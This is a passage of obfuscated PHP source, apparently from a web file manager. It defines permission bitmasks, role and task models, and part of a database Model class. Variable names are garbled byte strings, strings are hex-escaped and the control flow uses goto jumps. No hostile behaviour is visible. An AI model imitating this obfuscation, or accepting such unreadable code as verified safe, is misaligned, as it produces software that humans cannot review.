AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Ò¦ó¡Ïû =& $_SERVER[³½¬ÚË¯]; $Î…ıã±Ô = array(array($Ò¦ó¡Ïû[462] => LNG($Ò¦ó¡Ïû[1889]), $Ò¦ó¡Ïû[1890] => $Ò¦ó¡Ïû[1891], $Ò¦ó¡Ïû[1892] => 1, $Ò¦ó¡Ïû[1893] => 1, $Ò¦ó¡Ïû[1894] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ò¦ó¡Ïû[462] => LNG($Ò¦ó¡Ïû[1895]), $Ò¦ó¡Ïû[1890] => $Ò¦ó¡Ïû[1896], $Ò¦ó¡Ïû[1892] => 2, $Ò¦ó¡Ïû[1893] => 1, $Ò¦ó¡Ïû[1894] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ò¦ó¡Ïû[462] => LNG($Ò¦ó¡Ïû[1897]), $Ò¦ó¡Ïû[1890] => $Ò¦ó¡Ïû[1898], $Ò¦ó¡Ïû[1892] => 3, $Ò¦ó¡Ïû[1893] => 1, $Ò¦ó¡Ïû[1894] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ò¦ó¡Ïû[462] => LNG($Ò¦ó¡Ïû[1899]), $Ò¦ó¡Ïû[1890] => $Ò¦ó¡Ïû[1900], $Ò¦ó¡Ïû[1892] => 4, $Ò¦ó¡Ïû[1893] => 1, $Ò¦ó¡Ïû[1894] => self::AUTH_SHOW | self::AUTH_VIEW), array($Ò¦ó¡Ïû[462] => LNG($Ò¦ó¡Ïû[1901]), $Ò¦ó¡Ïû[1890] => $Ò¦ó¡Ïû[1902], $Ò¦ó¡Ïû[1892] => 5, $Ò¦ó¡Ïû[1893] => 1, $Ò¦ó¡Ïû[1894] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Ò¦ó¡Ïû[462] => LNG($Ò¦ó¡Ïû[1903]), $Ò¦ó¡Ïû[1890] => $Ò¦ó¡Ïû[1904], $Ò¦ó¡Ïû[1892] => 6, $Ò¦ó¡Ïû[1893] => 1, $Ò¦ó¡Ïû[1894] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Ò¦ó¡Ïû[462] => LNG($Ò¦ó¡Ïû[1905]), $Ò¦ó¡Ïû[1890] => $Ò¦ó¡Ïû[1906], $Ò¦ó¡Ïû[1892] => 7, $Ò¦ó¡Ïû[1893] => 1, $Ò¦ó¡Ïû[1894] => 0)); return $Î…ıã±Ô; } public static function authCheck($›ñ¹Ñ®, $«µ®ÔÈõ) { $¨ù¨ÇÉ‚ =& $_SERVER[³½¬ÚË¯]; $›ñ¹Ñ® = intval($›ñ¹Ñ®); if ($GLOBALS[$¨ù¨ÇÉ‚[537]] && $GLOBALS[$¨ù¨ÇÉ‚[6]][$¨ù¨ÇÉ‚[1907]]) { return !0; } if ($›ñ¹Ñ® <= 0) { return !1; } if (($›ñ¹Ñ® & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($›ñ¹Ñ® & $«µ®ÔÈõ); } public static function authCheckShow($ë§ŸíÄ) { return self::authCheck($ë§ŸíÄ, self::AUTH_SHOW); } public static function authCheckView($ó”ÙÂ©) { return self::authCheck($ó”ÙÂ©, self::AUTH_VIEW); } public static function authCheckDownload($ò¤ª÷§) { return self::authCheck($ò¤ª÷§, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ø­«°²°) { return self::authCheck($ø­«°²°, self::AUTH_UPLOAD); } public static function authCheckEdit($Èö©¹Ã“) { return self::authCheck($Èö©¹Ã“, self::AUTH_EDIT); } public static function authCheckRemove($ıíĞ›€Î) { return self::authCheck($ıíĞ›€Î, self::AUTH_REMOVE); } public static function authCheckShare($úõÜ„ª) { return self::authCheck($úõÜ„ª, self::AUTH_SHARE); } public static function authCheckComment($Îşßº…¨) { return self::authCheck($Îşßº…¨, self::AUTH_COMMENT); } public static function authCheckEvent($¹şœ³ç) { return self::authCheck($¹şœ³ç, self::AUTH_EVENT); } public static function authCheckRoot($‚¸¢­¡) { return self::authCheck($‚¸¢­¡, self::AUTH_ROOT); } public static function authCheckAction($ÚÒæøÏ¡, $Ÿï±Æç») { $ôÂËñ†ô =& $_SERVER[³½¬ÚË¯]; $°·ÊôÈµ = array($ôÂËñ†ô[1908] => self::AUTH_VIEW, $ôÂËñ†ô[1237] => self::AUTH_DOWNLOAD, $ôÂËñ†ô[107] => self::AUTH_UPLOAD, $ôÂËñ†ô[1858] => self::AUTH_EDIT, $ôÂËñ†ô[1857] => self::AUTH_REMOVE, $ôÂËñ†ô[1868] => self::AUTH_SHARE, $ôÂËñ†ô[398] => self::AUTH_COMMENT, $ôÂËñ†ô[1678] => self::AUTH_EVENT, $ôÂËñ†ô[1909] => self::AUTH_ROOT); if (!isset($°·ÊôÈµ[$Ÿï±Æç»])) { return; } $ë Òˆ‡• = $°·ÊôÈµ[$Ÿï±Æç»]; $ÚÒæøÏ¡ = intval($ÚÒæøÏ¡); if ($ÚÒæøÏ¡ <= 0) { return !1; } if (($ÚÒæøÏ¡ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÚÒæøÏ¡ & $ë Òˆ‡•); } public static function authDisable($¡Û³Û»Š, $åšñäñ) { if (intval($¡Û³Û»Š) <= 0) { return 0; } return intval($¡Û³Û»Š) & ~$åšñäñ; } public $optionType = "\x53\171\x73\164\145\155\56\x73\157\165\x72\143\x65\101\165\164\x68\114\151\x73\x74"; public $field = array("\156\x61\155\145", "\x61\165\x74\150", "\x6c\141\142\145\154", "\144\x69\163\x70\154\141\x79", "\163\x79\163\x74\x65\155", "\x73\157\162\x74"); public function initData() { $”ùÉ¬ï¶ = $this->authDefault(); foreach ($”ùÉ¬ï¶ as $÷ó¤Ø±Ò) { $this->add($÷ó¤Ø±Ò); } } public function findAuth($ÃĞœè», $’µ¤÷‰è) { $å•Ğ¤äŒ =& $_SERVER[³½¬ÚË¯]; $½˜÷Ãøç = parent::listData(); foreach ($½˜÷Ãøç as $º²ÎËâà) { $¥—ªë¶ƒ = intval($º²ÎËâà[$å•Ğ¤äŒ[455]]); if ($¥—ªë¶ƒ <= 0 || $º²ÎËâà[$å•Ğ¤äŒ[1910]] == 0) { continue; } if (($¥—ªë¶ƒ & $ÃĞœè») != $ÃĞœè») { continue; } if (($¥—ªë¶ƒ & $’µ¤÷‰è) != 0) { continue; } return $º²ÎËâà[$å•Ğ¤äŒ[443]]; } return !1; } public function findAuthReadOnly() { $ö¾Öï´œ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $Õ¼ÚÃôà = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ö¾Öï´œ, $Õ¼ÚÃôà); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $¾ğ„·ğÍ =& $_SERVER[³½¬ÚË¯]; $ÙµâãÙÕ = parent::listData(); $½‘íÑşÛ = !1; foreach ($ÙµâãÙÕ as $ÊÆ–Õñ) { if ($ÊÆ–Õñ[$¾ğ„·ğÍ[455]] <= 0 || $ÊÆ–Õñ[$¾ğ„·ğÍ[1910]] == $¾ğ„·ğÍ[212]) { continue; } if (!$½‘íÑşÛ) { $½‘íÑşÛ = $ÊÆ–Õñ; continue; } if ($½‘íÑşÛ[$¾ğ„·ğÍ[455]] > $ÊÆ–Õñ[$¾ğ„·ğÍ[455]]) { $½‘íÑşÛ = $ÊÆ–Õñ; } } return $½‘íÑşÛ ? $½‘íÑşÛ[$¾ğ„·ğÍ[443]] : $¾ğ„·ğÍ[12]; } public function listData($ğ•‚ïªã = false, $™À§Ç–ã = "\x73\157\162\164", $¿˜Óº = false) { return parent::listData($ğ•‚ïªã, $™À§Ç–ã, $¿˜Óº); } public function update($ÇÑöë­Ó, $êˆšóï) { $µë›„À =& $_SERVER[³½¬ÚË¯]; $¬”“× = parent::listData($ÇÑöë­Ó); $êèëª»¼ = $this->findByName($êˆšóï[$µë›„À[32]]); if (!$¬”“× || $êèëª»¼ && $êèëª»¼[$µë›„À[443]] != $¬”“×[$µë›„À[443]]) { return !1; } $this->filterAuth($êˆšóï[$µë›„À[455]]); return parent::update($ÇÑöë­Ó, $êˆšóï); } public function remove($ËÏÂ»£) { $åˆ ­Åï = parent::listData($ËÏÂ»£); if (!$åˆ ­Åï || $åˆ ­Åï[$_SERVER[³½¬ÚË¯][179]]) { return !1; } return parent::remove($ËÏÂ»£); } public function add($Œ“Ú‰Û² = array()) { $ÁÊì¾† =& $_SERVER[³½¬ÚË¯]; if ($this->findByName($Œ“Ú‰Û²[$ÁÊì¾†[32]])) { return !1; } $šé‚‚öò = array($ÁÊì¾†[32] => $ÁÊì¾†[12], $ÁÊì¾†[455] => 1, $ÁÊì¾†[1911] => $ÁÊì¾†[1898], $ÁÊì¾†[1910] => 1, $ÁÊì¾†[179] => 0, $ÁÊì¾†[1912] => 0); $Œ“Ú‰Û² = array_merge($šé‚‚öò, $Œ“Ú‰Û²); $Œ“Ú‰Û²[$ÁÊì¾†[1912]] = $this->getSort(); $this->filterAuth($Œ“Ú‰Û²[$ÁÊì¾†[455]]); return parent::insert($Œ“Ú‰Û²); } private function getSort() { $²‡›¯–› =& $_SERVER[³½¬ÚË¯]; $Ÿ–î—İÚ = parent::listData(); $Å²ó½½ù = array_to_keyvalue($Ÿ–î—İÚ, $²‡›¯–›[12], $²‡›¯–›[1912]); return empty($Å²ó½½ù) ? 0 : max($Å²ó½½ù) + 1; } private function filterAuth(&$Ø»¡éåÀ) { if (!$Ø»¡éåÀ) { return; } $‰Ëåì±¾ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $õ‚Í¯Úª = array(); foreach ($‰Ëåì±¾ as $ÂÊ—Šõ) { if ($Ø»¡éåÀ & $ÂÊ—Šõ) { $õ‚Í¯Úª[] = $ÂÊ—Šõ; } } if (in_array(self::AUTH_ROOT, $õ‚Í¯Úª)) { $Ø»¡éåÀ = array_sum($‰Ëåì±¾); return; } $›è§÷™ä = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($õ‚Í¯Úª as $ÂÊ—Šõ) { if (isset($›è§÷™ä[$ÂÊ—Šõ])) { $õ‚Í¯Úª = array_merge($õ‚Í¯Úª, $›è§÷™ä[$ÂÊ—Šõ]); } } $õ‚Í¯Úª[] = self::AUTH_SHOW; $Ø»¡éåÀ = array_sum(array_unique($õ‚Í¯Úª)); } public function sort($ùêæµ¼», $â§áÖÔ) { return parent::update($ùêæµ¼», $â§áÖÔ); } } goto AáÑêäÃØ; eßôÜ·—Õ: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\56\x72\157\x6c\x65\x4c\x69\163\x74"; public $field = array("\156\x61\x6d\x65", "\x61\165\x74\150", "\x6c\x61\142\145\x6c", "\144\151\x73\160\x6c\x61\171", "\163\171\x73\164\x65\155", "\x64\x65\x73\143", "\151\147\156\157\x72\x65\x45\170\164", "\151\147\156\157\162\x65\106\151\154\145\x53\x69\x7a\145", "\141\144\155\x69\156\x69\163\x74\x72\141\x74\x6f\162", "\x73\x6f\162\x74"); public function listData($Ú’óƒÓË = false, $óå½üê½ = "\163\x6f\162\164", $‚éìÆ¯’ = false) { $Æ¥¸¹Õæ =& $_SERVER[³½¬ÚË¯]; $ÖÆù÷÷Ú = parent::listData($Ú’óƒÓË, $óå½üê½, $‚éìÆ¯’); if (!$Ú’óƒÓË) { foreach ($ÖÆù÷÷Ú as $ã•°áˆ => $ÚÜÕêõ) { if ($ÚÜÕêõ[$Æ¥¸¹Õæ[2090]] == 1) { $ÖÆù÷÷Ú[$ã•°áˆ][$Æ¥¸¹Õæ[494]] = LNG($Æ¥¸¹Õæ[2329]); } } } return $ÖÆù÷÷Ú; } public function update($ş¿Ëğ–, $Û·°äÀ„) { $½µ øÄé =& $_SERVER[³½¬ÚË¯]; $ƒşÆßªÛ = parent::listData($ş¿Ëğ–); $Ê–±è«¼ = $this->findByName($Û·°äÀ„[$½µ øÄé[32]]); if (!$ƒşÆßªÛ || $Ê–±è«¼ && $Ê–±è«¼[$½µ øÄé[443]] != $ƒşÆßªÛ[$½µ øÄé[443]]) { return !1; } if ($Ê–±è«¼[$½µ øÄé[2090]] == 1) { $Û·°äÀ„ = array($½µ øÄé[32] => $Û·°äÀ„[$½µ øÄé[32]], $½µ øÄé[1911] => $Û·°äÀ„[$½µ øÄé[1911]]); } $this->filterAuth($Û·°äÀ„[$½µ øÄé[455]]); return parent::update($ş¿Ëğ–, $Û·°äÀ„); } public function remove($€ûÊã³³) { $ş‡Ÿİ™ = parent::listData($€ûÊã³³); if (!$ş‡Ÿİ™ || $ş‡Ÿİ™[$_SERVER[³½¬ÚË¯][179]]) { return !1; } return parent::remove($€ûÊã³³); } public function add($‚÷ñí ô) { $è³­ùı‹ =& $_SERVER[³½¬ÚË¯]; $éÉ¢ËÎ = $‚÷ñí ô[$è³­ùı‹[32]]; if ($this->findByName($éÉ¢ËÎ)) { return !1; } $ÕÚççôÇ = array($è³­ùı‹[462] => $éÉ¢ËÎ, $è³­ùı‹[1894] => $è³­ùı‹[12], $è³­ùı‹[1890] => $è³­ùı‹[1898], $è³­ùı‹[2330] => 1, $è³­ùı‹[1893] => 0, $è³­ùı‹[2331] => 0, $è³­ùı‹[1892] => $this->getSort()); $‚÷ñí ô = array_merge($ÕÚççôÇ, $‚÷ñí ô); $this->filterAuth($‚÷ñí ô[$è³­ùı‹[455]]); return parent::insert($‚÷ñí ô); } private function getSort() { $ª¶‰‰Ù´ =& $_SERVER[³½¬ÚË¯]; $İÔêÚŒ¡ = parent::listData(); $¾Š°««„ = array_to_keyvalue($İÔêÚŒ¡, $ª¶‰‰Ù´[12], $ª¶‰‰Ù´[1912]); return empty($¾Š°««„) ? 0 : max($¾Š°««„) + 1; } private function filterAuth(&$İæâüĞµ) { $ÂÕøæı÷ =& $_SERVER[³½¬ÚË¯]; $…Ã™Ê = array(); $¬ôî¿ = array_filter(explode($ÂÕøæı÷[50], $İæâüĞµ)); foreach ($¬ôî¿ as $İæâüĞµ) { $ñºŒ”Ä = explode($ÂÕøæı÷[10], $İæâüĞµ); if ($ñºŒ”Ä[0] == $ÂÕøæı÷[2332] && $ñºŒ”Ä[1] != $ÂÕøæı÷[1233]) { $¸§à”ïÙ = $ñºŒ”Ä[0] . $ÂÕøæı÷[10] . $ñºŒ”Ä[1] . $ÂÕøæı÷[2333]; if (!in_array($¸§à”ïÙ, $¬ôî¿)) { $…Ã™Ê[] = $¸§à”ïÙ; } } $…Ã™Ê[] = $İæâüĞµ; } $İæâüĞµ = implode($ÂÕøæı÷[50], $…Ã™Ê); } public function findRoleDefault() { $¼é®ºˆØ =& $_SERVER[³½¬ÚË¯]; $ìë ìÓ¯ = parent::listData(); $½Ÿ¢š†Ô = !1; foreach ($ìë ìÓ¯ as $Í¦ğÓî°) { if (!$Í¦ğÓî° || $Í¦ğÓî°[$¼é®ºˆØ[1910]] == $¼é®ºˆØ[212] || $Í¦ğÓî°[$¼é®ºˆØ[2090]] == 1) { continue; } if (strstr($Í¦ğÓî°[$¼é®ºˆØ[455]], $¼é®ºˆØ[2334])) { continue; } if (!strstr($Í¦ğÓî°[$¼é®ºˆØ[455]], $¼é®ºˆØ[2335])) { continue; } if (!$½Ÿ¢š†Ô) { $½Ÿ¢š†Ô = $Í¦ğÓî°; continue; } $†áÇæÓ = explode($¼é®ºˆØ[50], $½Ÿ¢š†Ô[$¼é®ºˆØ[455]]); $ôÍ™Òßï = explode($¼é®ºˆØ[50], $Í¦ğÓî°[$¼é®ºˆØ[455]]); if (count($†áÇæÓ) > count($ôÍ™Òßï)) { $½Ÿ¢š†Ô = $Í¦ğÓî°; } } return $½Ÿ¢š†Ô ? $½Ÿ¢š†Ô[$¼é®ºˆØ[443]] : $¼é®ºˆØ[12]; } public function sort($Ã®›ß‘Ğ, $¬êµ¹æ) { return parent::update($Ã®›ß‘Ğ, $¬êµ¹æ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\56\x74\x61\163\153\x4c\x69\163\164"; public $field = array("\156\x61\155\x65", "\x74\171\160\x65", "\145\166\145\156\x74", "\164\151\x6d\145", "\144\x65\x73\143", "\x73\171\163\x74\x65\x6d", "\145\156\x61\x62\x6c\145", "\x6c\x61\163\x74\122\x75\x6e", "\x73\157\x72\x74"); public function listData($‚¶£íƒÚ = false, $×¢ì×û” = "\163\157\162\x74", $Û•Ø¤Îä = false) { return parent::listData($‚¶£íƒÚ, $×¢ì×û”, $Û•Ø¤Îä); } public function add($¯À‘»€¡) { $Ø‹‰ê× =& $_SERVER[³½¬ÚË¯]; $«û°„³® = $this->findByName($¯À‘»€¡[$Ø‹‰ê×[32]]); if ($«û°„³®) { return !1; } $¯À‘»€¡[$Ø‹‰ê×[1647]] = 0; $¯À‘»€¡[$Ø‹‰ê×[1912]] = $this->getSort(); return parent::insert($¯À‘»€¡); } private function getSort() { $¬‡ÈŒÖ³ =& $_SERVER[³½¬ÚË¯]; $ŸŠÛ±îÍ = parent::listData(); $•Öµ©Ë‘ = array_to_keyvalue($ŸŠÛ±îÍ, $¬‡ÈŒÖ³[12], $¬‡ÈŒÖ³[1912]); return empty($•Öµ©Ë‘) ? 0 : max($•Öµ©Ë‘) + 1; } public function update($ÚìÍ¬±, $¼²éÕáÛ) { $ûµÜÉèë =& $_SERVER[³½¬ÚË¯]; $Àìóáõ = $this->listData($ÚìÍ¬±); $ğ¸´†Óû = $this->findByName($¼²éÕáÛ[$ûµÜÉèë[32]]); if (!$Àìóáõ || $ğ¸´†Óû && $ğ¸´†Óû[$ûµÜÉèë[443]] != $Àìóáõ[$ûµÜÉèë[443]]) { return !1; } return parent::update($ÚìÍ¬±, $¼²éÕáÛ); } public function remove($ÎÔŞíù«, $¯ÃËüç¡ = false) { $¬ªµêï =& $_SERVER[³½¬ÚË¯]; $¸éÒòŠ  = $this->listData($ÎÔŞíù«); if (!$¸éÒòŠ ) { return; } if (!$¯ÃËüç¡ && $¸éÒòŠ [$¬ªµêï[179]] == $¬ªµêï[88]) { return !1; } return parent::remove($ÎÔŞíù«); } public function enable($ü­Éº™È, $Ã›Å»äû) { return $this->update($ü­Éº™È, array($_SERVER[³½¬ÚË¯][2324] => $Ã›Å»äû)); } public function run($„±ô¾¡) { return $this->update($„±ô¾¡, array($_SERVER[³½¬ÚË¯][2336] => time())); } } goto C•ê‘áÚŞ®; Dø¡Ò—Ğ°½: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\154\x65", "\157\162\144\145\162", "\x61\154\x69\x61\x73", "\150\x61\166\151\x6e\x67", "\147\x72\157\x75\x70", "\154\157\143\x6b", "\x64\x69\x73\164\151\x6e\143\x74", "\141\x75\x74\157", "\x66\151\154\164\x65\162", "\166\x61\x6c\151\x64\141\x74\x65", "\x72\x65\x73\x75\154\164", "\x62\x69\x6e\144", "\164\157\x6b\145\156"); public function __construct($†˜™±Åˆ = '', $áğ¹ ‰³ = '', $©ÔîÌÜ = '') { $²û¤Âô =& $_SERVER[³½¬ÚË¯]; $this->_initialize(); if (!empty($†˜™±Åˆ)) { if (strpos($†˜™±Åˆ, $²û¤Âô[10])) { list($this->dbName, $this->name) = explode($²û¤Âô[10], $†˜™±Åˆ); } else { $this->name = $†˜™±Åˆ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($áğ¹ ‰³)) { $this->tablePrefix = $²û¤Âô[12]; } elseif ($²û¤Âô[12] != $áğ¹ ‰³) { $this->tablePrefix = $áğ¹ ‰³; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($²û¤Âô[288]); } $this->db(0, empty($this->connection) ? $©ÔîÌÜ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ú»Ğß“£ =& $_SERVER[³½¬ÚË¯]; if (empty($this->fields)) { if (think_config($ú»Ğß“£[289])) { $ê³ÁÙ° = $this->dbName ? $this->dbName : think_config($ú»Ğß“£[290]); $Ê¿÷’œâ = think_var_cache($ú»Ğß“£[291] . strtolower(get_path_this($ê³ÁÙ°) . $ú»Ğß“£[10] . $this->name)); if ($Ê¿÷’œâ) { $ŸÙü½îÅ = think_config($ú»Ğß“£[292]); if (empty($ŸÙü½îÅ) || $Ê¿÷’œâ[$ú»Ğß“£[293]] == $ŸÙü½îÅ) { $this->fields = $Ê¿÷’œâ; return; } } } $this->flush(); } } public function flush() { $¬ªÑø”½ =& $_SERVER[³½¬ÚË¯]; $this->db->setModel($this->name); $„Ù€¶ı = $this->db->getFields($this->getTableName()); if (!$„Ù€¶ı) { return !1; } $this->fields = array_keys($„Ù€¶ı); $this->fields[$¬ªÑø”½[294]] = !1; foreach ($„Ù€¶ı as $°õäûµº => $’ìèŠ´¼) { $ó—ã’™«[$°õäûµº] = $’ìèŠ´¼[$¬ªÑø”½[33]]; if ($’ìèŠ´¼[$¬ªÑø”½[39]]) { $this->fields[$¬ªÑø”½[295]] = $°õäûµº; if ($’ìèŠ´¼[$¬ªÑø”½[42]]) { $this->fields[$¬ªÑø”½[294]] = !0; } } } $this->fields[$¬ªÑø”½[296]] = $ó—ã’™«; if (think_config($¬ªÑø”½[292])) { $this->fields[$¬ªÑø”½[293]] = think_config($¬ªÑø”½[292]); } if (think_config($¬ªÑø”½[289])) { $ õÏèëù = $this->dbName ? $this->dbName : think_config($¬ªÑø”½[290]); think_var_cache($¬ªÑø”½[291] . strtolower(get_path_this($ õÏèëù) . $¬ªÑø”½[10] . $this->name), $this->fields); } } public function switchModel($ÎÂÃ”«é, $ˆúßÙÇ = array()) { $–¥ñÒ®Ÿ =& $_SERVER[³½¬ÚË¯]; $ûíç´ÂÑ = ucwords(strtolower($ÎÂÃ”«é)) . $–¥ñÒ®Ÿ[297]; if (!class_exists($ûíç´ÂÑ)) { think_exception($ûíç´ÂÑ . think_lang($–¥ñÒ®Ÿ[298])); } $this->_extModel = new $ûíç´ÂÑ($this->name); if (!empty($ˆúßÙÇ)) { foreach ($ˆúßÙÇ as $‘óğ•ŒÁ) { $this->_extModel->setProperty($‘óğ•ŒÁ, $this->{$‘óğ•ŒÁ}); } } return $this->_extModel; } public function __set($€ïÎ–’¼, $äéÌ§áà) { $this->data[$€ïÎ–’¼] = $äéÌ§áà; } public function __get($·şÇ¿â¡) { return isset($this->data[$·şÇ¿â¡]) ? $this->data[$·şÇ¿â¡] : null; } public function __isset($—·¦¦éî) { return isset($this->data[$—·¦¦éî]); } public function __unset($ÚÈœ‹Éß) { unset($this->data[$ÚÈœ‹Éß]); } public function __call($ÁŞ“°Š, $¡»ßğÓü) { $¬üœ°ò‰ =& $_SERVER[³½¬ÚË¯]; if (in_array(strtolower($ÁŞ“°Š), $this->methods, !0)) { $this->options[strtolower($ÁŞ“°Š)] = $¡»ßğÓü[0]; return $this; } elseif (in_array(strtolower($ÁŞ“°Š), array($¬üœ°ò‰[299], $¬üœ°ò‰[300], $¬üœ°ò‰[301], $¬üœ°ò‰[302], $¬üœ°ò‰[303]), !0)) { $µ’Òö«¥ = isset($¡»ßğÓü[0]) ? $¡»ßğÓü[0] : $¬üœ°ò‰[203]; $µ’Òö«¥ = $this->db->parseKey($µ’Òö«¥); return $this->getField(strtoupper($ÁŞ“°Š) . $¬üœ°ò‰[304] . $µ’Òö«¥ . $¬üœ°ò‰[305] . $ÁŞ“°Š, $¬üœ°ò‰[299]); } elseif (strtolower(substr($ÁŞ“°Š, 0, 5)) == $¬üœ°ò‰[306]) { $µ’Òö«¥ = think_parse_name(substr($ÁŞ“°Š, 5)); $Íáï€şö[$µ’Òö«¥] = $¡»ßğÓü[0]; return $this->where($Íáï€şö)->find(); } elseif (strtolower(substr($ÁŞ“°Š, 0, 10)) == $¬üœ°ò‰[307]) { $âÉåÉœÂ = think_parse_name(substr($ÁŞ“°Š, 10)); $Íáï€şö[$âÉåÉœÂ] = $¡»ßğÓü[0]; return $this->where($Íáï€şö)->getField($¡»ßğÓü[1]); } elseif (isset($this->_scope[$ÁŞ“°Š])) { return $this->scope($ÁŞ“°Š, $¡»ßğÓü[0]); } elseif (method_exists($this, $ÁŞ“°Š)) { array_unshift($¡»ßğÓü, $ÁŞ“°Š); return call_user_func_array(array($this, $¬üœ°ò‰[308]), $¡»ßğÓü); } else { return call_user_func_array(array(parent, $ÁŞ“°Š), $¡»ßğÓü); } } protected function call() { $éÉú­áÎ =& $_SERVER[³½¬ÚË¯]; $®åæúæŠ = func_get_args(); $ó¤¨¥¿ß = array_shift($®åæúæŠ); $¯Ê•Óëº = $ó¤¨¥¿ß; if (is_array($ó¤¨¥¿ß)) { $¯Ê•Óëº = $ó¤¨¥¿ß[1]; $ó¤¨¥¿ß = $ó¤¨¥¿ß[0]; } $àŒ¥‚¾„ = count($®åæúæŠ) - 1; if (isset($®åæúæŠ[$àŒ¥‚¾„]) && $®åæúæŠ[$àŒ¥‚¾„] === $ó¤¨¥¿ß) { think_exception(__CLASS__ . $éÉú­áÎ[4] . $ó¤¨¥¿ß . think_lang($éÉú­áÎ[309])); return; } $®åæúæŠ[] = $ó¤¨¥¿ß; if (method_exists($this, $éÉú­áÎ[310])) { $­ˆ‰–œ = call_user_func_array(array($this, $éÉú­áÎ[311]), array($¯Ê•Óëº, $®åæúæŠ)); if (!is_null($­ˆ‰–œ) && $­ˆ‰–œ !== !1) { return $­ˆ‰–œ; } } $¨¡ÑæìĞ = call_user_func_array(array($this, $ó¤¨¥¿ß), $®åæúæŠ); if (method_exists($this, $éÉú­áÎ[312])) { $­ˆ‰–œ = call_user_func_array(array($this, $éÉú­áÎ[313]), array($¯Ê•Óëº, $®åæúæŠ, $¨¡ÑæìĞ)); if ($­ˆ‰–œ) { return $­ˆ‰–œ; } } return $¨¡ÑæìĞ; } protected function _initialize() { } protected function _facade($öŞÔ÷íÒ) { $É†ş¾ =& $_SERVER[³½¬ÚË¯]; if (!empty($this->fields)) { foreach ($öŞÔ÷íÒ as $àÖØÎ¶€ => $‹Ìá¶ê) { if (is_array($this->fields) && !in_array($àÖØÎ¶€, $this->fields, !0)) { unset($öŞÔ÷íÒ[$àÖØÎ¶€]); } elseif (is_scalar($‹Ìá¶ê)) { $this->_parseType($öŞÔ÷íÒ, $àÖØÎ¶€); } } } if (!empty($this->options[$É†ş¾[314]])) { $öŞÔ÷íÒ = array_map($this->options[$É†ş¾[314]], $öŞÔ÷íÒ); unset($this->options[$É†ş¾[314]]); } $this->_beforeWrite($öŞÔ÷íÒ); return $öŞÔ÷íÒ; } protected function _beforeWrite(&$¤µËé÷) { } public function add($ô¼áø“÷ = '', $˜Ûç‡èà = array(), $ëö¼Š”ş = false) { if (empty($ô¼áø“÷)) { if (!empty($this->data)) { $ô¼áø“÷ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[³½¬ÚË¯][315]); return !1; } } $˜Ûç‡èà = $this->_parseOptions($˜Ûç‡èà); $ô¼áø“÷ = $this->_facade($ô¼áø“÷); if (!1 === $this->_beforeInsert($ô¼áø“÷, $˜Ûç‡èà)) { return !1; } $°ªÃÏµ = $this->db->insert($ô¼áø“÷, $˜Ûç‡èà, $ëö¼Š”ş); if (!1 !== $°ªÃÏµ) { $É©õ«íş = $this->getLastInsID(); if ($É©õ«íş) { $ô¼áø“÷[$this->getPk()] = $É©õ«íş; $this->_after_insert($ô¼áø“÷, $˜Ûç‡èà); return $É©õ«íş; } $this->_after_insert($ô¼áø“÷, $˜Ûç‡èà); } return $°ªÃÏµ; } protected function _beforeInsert(&$ºëïÑ°é, $Øëî¾©) { } protected function _after_insert($†œƒîêö, $ò¬à´³—) { } public function addAll($•ïÒÜ‘Î, $Ÿ¢è–— = array(), $”ÙúË½š = false) { $”â”ÒîØ =& $_SERVER[³½¬ÚË¯]; if (empty($•ïÒÜ‘Î)) { $this->error = think_lang($”â”ÒîØ[315]); return !1; } $Ÿ¢è–— = $this->_parseOptions($Ÿ¢è–—); foreach ($•ïÒÜ‘Î as $°ã·ôº => 